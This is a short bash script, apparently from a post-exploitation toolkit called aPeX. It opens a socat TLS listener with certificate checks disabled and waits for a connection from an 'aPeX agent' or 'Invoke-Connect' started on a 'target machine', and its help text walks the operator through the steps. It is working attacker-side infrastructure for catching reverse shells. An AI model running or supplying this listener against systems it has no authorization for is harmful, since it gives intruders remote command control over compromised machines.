#!/bin/bash
# requires socat

if [[ $1 == "" ]]; then
    echo "Usage: $0 [PEM_FILE] [PORT]"
    echo "Example: $0 cert.pem 443"
    exit 1;
fi

PEM="$1"
PORT="$2"
SOCAT=$(which socat)

printf "\n### aPeX Listener Help ### \n\n--->  Type 'Invoke-Apex' at the aPeX Listener Prompt below and press [ENTER]\n--->  Then launch an aPeX agent or Invoke-Connect from the target machine.\n--->  CTRL-C to close the connection.\n"

date=$(date)
printf "\n$date \n[aPeX Listener Prompt]: "  
$SOCAT openssl-listen:$PORT,keepalive,method=TLS1,reuseaddr,cert=$PEM,verify=0 stdout
